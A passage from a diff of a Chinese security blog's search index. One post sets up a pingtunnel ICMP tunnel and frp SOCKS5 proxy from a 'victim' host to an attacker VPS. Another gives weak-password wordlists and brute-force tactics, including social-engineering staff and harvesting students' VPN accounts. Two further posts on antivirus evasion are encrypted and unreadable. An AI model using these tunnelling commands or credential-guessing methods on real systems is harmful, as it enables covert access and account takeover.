db0591676184f5f15be61ce065f86b08a232975beebe0f5b02e6bef805051907ccc8332ce2d72d65a272d655c56c6da08dfd7d88df2a038cb64e320ed32baa579a0508271028410e07f529891d002e85561e42783abc4ccc5f4fd5ded273f9e4971a8ae55caa21d24e4dc94b477b2ed932f0d95b3f26a9c281f3c958e423c4a9eb66f0fe5893d0d3c3ec0281448fc8acf16d3b1bb07d83ca63dfe42f0e782e55f3fe852304270fed022686d3ee5082ae506791eba3c4a1e34da28648c0d976c5c94d2876b244ce120a1e0a64bb7f572971a0740c37d3538c3ef007543b6890d8262b3c2e381f49e5ec8217edebdd5305e6427b9ab4b63893d57f6ce94f103635022fe09d7c67adcbd2d252fb8a502bae596aa76734bd6033c93de72668b2fe5886755817a969e63d62f973f87f9cd40595452461d2180a888bffdb0d00af7682917daf15de4a05ba8ae1a59cc5ac8d0f498b494138f166e906362e977c4204b22cb60bc828eda1af1a5f8d60be537b9c61a94df2a872d5ac72bc310800b6057883f8ff835a903602ab8f5d0442218b84f7ec4b3bfb18e5cd3417fbb551bdf9c0906487cb84816784466135ad0c9523d7fca757333ff76cdd4f795424a7fc1cc21d6038772f2c26cbf42a5cef6ea47c2b9d08942a31086cfd8dc09a07365d85fbf052bf8fcfad9e4181e204c8af6bd563056da10ede38b95e0225dfc6296ef34d3e0cc42b367bc46b8e7f3f91f43dce4dd2df9f8a3e61b575a442da2eb398b9711c168ded450e7924f8f47b8a4e4157388c37708a09a21aaecdb164</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <tags>
+        <tag>hw</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pingtunnel搭建icmp隧道</title>
+    <url>/2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
+    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p>
+<a id="more"></a>
+
+<h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p>
+<h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure>
+
+<p>vps</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote>
+<p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p>
+<p>虚拟机测试似乎不行</p>
+</blockquote>
+<h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p>
+<hr>
+<p>最后，感谢戴哥哥和超哥的耐心解答。</p>
+<h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+]]></content>
+      <tags>
+        <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈弱口令爆破思路</title>
+    <url>/2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>无论是内网渗透还是外网渗透，无论是web应用还是ssh、rdp、mysql等常见应用，弱口令爆破都是<strong>值得</strong>尝试的一个途径。</p>
+<a id="more"></a>
+
+<h4 id="二、字典"><a href="#二、字典" class="headerlink" title="二、字典"></a>二、字典</h4><p>字典决定了弱口令爆破的成功与否，字典分为用户名和密码。</p>
+<p>在近几次开展的攻防演戏活动中，整理了爆破成功的大概下面几种类型。</p>
+<h5 id="1、用户名"><a href="#1、用户名" class="headerlink" title="1、用户名"></a>1、用户名</h5><p>常见用户名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">Admin</span><br><span class="line">scacdmin</span><br><span class="line">strong</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">john</span><br></pre></td></tr></table></figure>
+
+<p>数字</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">123</span><br><span class="line">860</span><br></pre></td></tr></table></figure>
+
+<p>手机号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17865154061</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>收集那个地区的手机号进行爆破</p>
+<p>社工公司内部员工</p>
+</blockquote>
+<p>姓名拼音</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yanli</span><br><span class="line">dj_yao</span><br><span class="line">yanshi</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>P牛的星球看到的：大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做</p>
+<p>对于千人及以下的中小型创业公司，企查查和爱企查爬一下这个公司的专利信息列表</p>
+</blockquote>
+<blockquote>
+<p>使用下面的项目字典生成很简单</p>
+<p><a href="https://github.com/LandGrey/ChineseMaskReflector">https://github.com/LandGrey/ChineseMaskReflector</a></p>
+<p>目前我的字典包含如下（中国姓名top500），孙大圣为例</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sundasheng</span><br><span class="line">sunds</span><br><span class="line">dssun</span><br><span class="line">sds</span><br><span class="line">ds_sun</span><br><span class="line">dashengsun</span><br><span class="line">Sundasheng</span><br><span class="line">Sds</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上面的也可以用到自定义密码生成中</p>
+</blockquote>
+<p>域名、地域名、机关名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>关键</p>
+</blockquote>
+<h5 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h5><p>常见密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123456</span><br><span class="line">admin</span><br><span class="line">manage</span><br><span class="line">strong</span><br><span class="line">11111</span><br><span class="line">admin123!</span><br><span class="line">12345678;abc</span><br><span class="line">12345!@#$%abc</span><br><span class="line">Passw0rd</span><br><span class="line">p@ssword</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>自定义</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Admin&#x2F;Cx123456（cx市）</span><br><span class="line">xzadmin&#x2F;xz@123456（xz市）</span><br><span class="line">strong&#x2F;yyslj!@#123（yy市水利局）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p>
+</blockquote>
+<p>先写入data.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zhejiang</span><br><span class="line">243536998</span><br><span class="line">sundasheng</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python pydictor.py -extend data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>另外一个更加自定义的工具</p>
+<p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1</a></p>
+<p>使用举例：<a href="https://www.cnblogs.com/cwkiller/p/12741086.html">https://www.cnblogs.com/cwkiller/p/12741086.html</a></p>
+</blockquote>
+<p>域名+数字</p>
+<p>域名+admin</p>
+<p>admin+域名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top100，</span><br><span class="line">mct@2020</span><br><span class="line">yanyi@mct.gov.cn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jxsdyyyadmin	**市第一医院</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>下面的是以前看到的，忘记出处了。结合白鹿生成器快速生成</p>
+</blockquote>
+<p><strong>账号规则</strong><br>以下均可尝试大小写：<br>admin+用户名缩写，比如用户叫张三，账号为adminzs<br>地名，比如地名叫傻蛋，账号为shadan<br>域名缩写，比如网站为<a href="http://www.test.com/">www.test.com</a>，账号为test<br>驻点单位名缩写_人名缩写_运维所属公司名缩写，比如驻点单位为天真傻蛋云平台，运维叫做张三，所属公司是犯贱有限公司，账号为tzsd_zs_fj<br>地名_邮编号码，比如地名是傻蛋，对应编号是000000，账号为sd_000000<br>测试账号+人名，比如anquanceshi、test、ceshi、ceshi_zs等等。<br><strong>密码规则</strong><br>以下均可尝试大小写：<br>键盘字母连键+特殊符号+键盘数字连键，字母和数字对应，比如键盘上asdf连着，密码为asdf<a href="https://www.t00ls.net/space-uid-8446.html">@1234</a><br>单位名称缩写/域名+特殊符号+3位或4位随机数，比如<a href="http://www.test.com/">www.test.com</a>，密码为test@2016<br>单位名缩写+人名缩写@工号，比如天真傻蛋大数据平台，运维叫张三，工号9541，密码为tzsdzs@9541<br>运维公司缩写+特殊符号+工号，比如天真傻蛋公司，工号是59861，密码为tzsd@59861</p>
+<p>用户名admin</p>
+<p>密码域名+8899</p>
+<h5 id="3、安全设备默认口令"><a href="#3、安全设备默认口令" class="headerlink" title="3、安全设备默认口令"></a>3、安全设备默认口令</h5><blockquote>
+<p><a href="https://www.freebuf.com/column/235632.html">https://www.freebuf.com/column/235632.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&amp;mid=2247484399&amp;idx=1&amp;sn=eaba60ade227f6a26ee194dfecfac1ff&amp;scene=21#wechat_redirect</a></p>
+</blockquote>
+<h4 id="三、爆破思路"><a href="#三、爆破思路" class="headerlink" title="三、爆破思路"></a>三、爆破思路</h4><p>1、固定用户名爆破密码</p>
+<p><code>admin</code>、<code>test</code>、<code>ceshi</code></p>
+<p>2、固定密码爆破用户名</p>
+<p><code>123456</code>、<code>111111</code></p>
+<p>3、用户名与密码相同</p>
+<p>4、验证码对抗</p>
+<p><code>Captcha-killer</code>插件</p>
+<h4 id="四、真实案例"><a href="#四、真实案例" class="headerlink" title="四、真实案例"></a>四、真实案例</h4><h5 id="1、学校VPN"><a href="#1、学校VPN" class="headerlink" title="1、学校VPN"></a>1、学校VPN</h5><p>微博超话获取到了学生的vpn账号</p>
+<p>入学通知获取到了姓名、学号，社工获取身份证号</p>
+<h5 id="2、离线爆破"><a href="#2、离线爆破" class="headerlink" title="2、离线爆破"></a>2、离线爆破</h5><p>一次实战中sql注入得到了后台账号密码，加盐md5，但是只解出了一组为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin1&#x2F;admin123!</span><br></pre></td></tr></table></figure>
+
+<p>根据域名等信息，并根据上面的格式生成字典爆破出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;*****123!</span><br></pre></td></tr></table></figure>
+
+<h5 id="3、账号密码都为域名缩写"><a href="#3、账号密码都为域名缩写" class="headerlink" title="3、账号密码都为域名缩写"></a>3、账号密码都为域名缩写</h5><p>一次实战中<code>hp**/hp**</code></p>
+]]></content>
+      <tags>
+        <tag>爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>多种免杀方式</title>
+    <url>/2020/11/09/%E5%A4%9A%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">您好, 这里需要密码.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="4d4927c8ee230f0dfa16b726026fc25d2247bde71c232b03bc66312a143fb3d3">ce0671668545d536d832057a54ebebe76674fc6ba3f0f6184d6ec70103cad529d489ae0da37d5c1418e89a5cd597d3a8282f3e44e22409f15b4800312e2d493dbf4e62bdfe73fbc09cc59257d9e2e392529f101b07e0aa5ba55f46a67ff14d806ef7cfaec97f78043c82819083f360de3227c16d5955989030ff86d9b03aed6ed5668d832c26c218c6592540015d6cf591cc8c90d377bcebf02e99e44fc9da1e068625c5bb5696a3f2a5c0e4aa278f74bc505f5f34e7fceb708b642062ac81d25ec17ac361442a797286df49f781e8907cdadd3761176a12e990eb870beb02aace21eb58ebc1ddab23bf38e997820101f45320921130bf0852c03d0e4fc2193e2cc561abd42d95ecb828a22f834875c39d0c0f4928d878a39b3bcacb0c43a2682a146d0d776bb1e2fce6cb7d4735ea513fca6fa94ff08ca2632df1a9ae254ba6ff5516a087061b0a25f3f2eea38de85393c92954766a61eae00172820a9dcb63a8869d9fb5046e7b858eaeb0b441c64a18079966ea3b42d09884b06a22ceba26226efda05396d7e93bc85d8766b0c629348f43846748d4ad65f07d507eddff432ea6cf19ff361d0a921981616fa04deb2287d7aeba8fec69798dc59939b61c40da41707e8728ae946d0efbd3cead9b8d85015588619648a8cc96f25a94260115f975f3a7977530aa3ce572116ffb490e7ba512c26f01ba415a34baa9859cb7c141a99d54b0de77f347d83294512a95b1db8b96d619efbe123ffaf9b8115c78c420d11abafa2d79a3db16f284777c8551ee13c991178221933909e1402a64e01eec8ffb18e823bf1973ab86da2f1af8d70a9467fe6ae9c41c8b0f360add4a56a632d8708325a207a6818bff208d0d3549c5b71b9a535c9c061b48f2deb43fbcc40c5e61f5f82c34e6d2da8bcfbf15367add36828417c678a0ca6b19d42742076dfc8d5a271e356c92d819217579f22957ac03f8ee380621abffb97e92f5bf297b0adba82775927428e64da9f492b2238f18e6a00fc2b8c8ed34890e3ab7351bd1d704e9e4682c834d41d72b1a31809fa1aa9768e6d10eda1563e182c036e9bad616709abbe315eb4b1ff96fabe609cc08594d2f168c59266328d1e5c1382610f7cdb26bebac07c3af0e52d18ccde083b443f208b9fc18e45147f65ea10e20acfe5a30cf59173244ff439039a8d03128843239569fd7e4bf1430f6bd270bfafabf209b09c2648565fc30fb24b341060c5b8f9a7d04b7992bd5b522a4effcde38d25cb8045519230f203b6fc419699277ca8aaacc14654ee1213456dd8194f711549e022321a07a8df4eaee09ddf87a2f22ef3836c3a395006cc7afd207fbc391521eb864e1c5ec57add14fe408c04a37981a8023c3b4cbbd754f1cb1a88d13a32a44608bc1f36ca9d7a4c2df6c5d2598e1542ce018d7557ae36684e6e97b69be8e6b94a7cc3dd7cbb2331f1f6db26337ad611dcf30505c722d4f3cacde230d225e3e09045dc8267925eac9e8583cdd7f131741e3c49ee6fb3e76b95a05afb2c36b13d737b5b2dc0fbac06adc27d8b95b4979d364e540681d80ac5a65e60345038996411bc5ee7e9550e908030f4c230a68ea0ea39607dd8e24034a92bc7e69e31eb090351f2e002c9bfb5da54bedacca4e95e5b09bb1c21f877225c7e0337a97974e0f7730296303d20a25a6b08230c06c90fd964968b12c9fa56b899e91cc29bd026a53017f38aee123994b32e61f73734cbae2e337b686f10533a380e0f6557d1545f59cd1e5c46fb6bce0e759babc09c20965521bdd1f3f5d94c40cba079c6f1cf60149af729fab82e29b3ce2c29000a98d35c88147124673187d6951ef55515b3687f6f0f809835c8bdf52392257bcd413f642d29a0ae47befb30b23a6963d7856da87687f274d76ed26278c20e6a0a9c08cd1110fe041af1802f609b0bef72727bb3a03807e2a20d0da370e9e53527dd78b52a955e74444bd255d985e4a93e23c92f9287f8215a934d4b0e431ff9303fd72b257e46a7ac8c86611a96e3492286f976bad329a3032b2945be47e71f38da585592662eb0b4613aa48a0fff47513ab46e77c67b49e323b324ddaa0e3db9b019d4fb71be7c24dfdf408255037f3a99a779727f2697e43a73c2c2d09c98d996b5a813e5a548fb32083c22f23f95f18c92d48aec944f586de3a6295070fdf4e2df1d08256081bd9fd42c8bb8b1e586b1f9546569afc41ba326137e087f453b1d3eda7fbe0cf98bbe6678182439df47abb486033f629a3bf1c2bddfefd949d3f4594aadca91a4070cb91a78a9dccc6a812f9fd0faa7524299f41fabd88c9d2302ccfde59e9177c9a632e7bf8c28fd30dd3df8b58dc278d82191ed5bd6cac92f34de191a26ebce11f7590ef8cd19b9e61489e2fe289c190096ec0deb6a0d237</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
 </search>
